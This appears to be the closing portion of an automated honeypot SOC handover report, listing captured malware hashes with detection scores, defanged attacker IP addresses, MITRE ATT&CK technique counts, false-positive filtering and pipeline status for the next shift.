| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `218.202.143[.]68` | CN | China Mobile Communications Corporation - neimeng | **100** ⚠️ | 50 |
| `102.221.30[.]186` | GH | Broadspectrum Limited | **100** ⚠️ | 4 |
| `14.103.111[.]135` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `160.251.233[.]37` | JP | GMO Internet, Inc. | **100** ⚠️ | 33 |
| `49.64.242[.]249` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `139.19.117[.]130` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |
| `117.39.63[.]46` | CN | CHINANET Shanxi(SN) province network | **100** ⚠️ | 50 |
| `14.103.107[.]234` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `106.104.160[.]194` | TW | Seednet-TaipeiDP-S | **100** ⚠️ | 10 |
| `103.203.57[.]19` | US | Beijing Tiantexin Tech. Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 555 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 295 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 198 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 100 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 99 |

---

## 🔕 False Positive Summary (58 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 20 below threshold 25 | 2 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 51 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 665 cases |
| Tool 34  | Credential Extractor        | ✅ 495 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 68 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 58 filtered (8.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 49 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 198 priority case(s) shown individually · 50 recon entry/entries in table (22 group(s) consolidating 381 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-13T09:22:25Z_
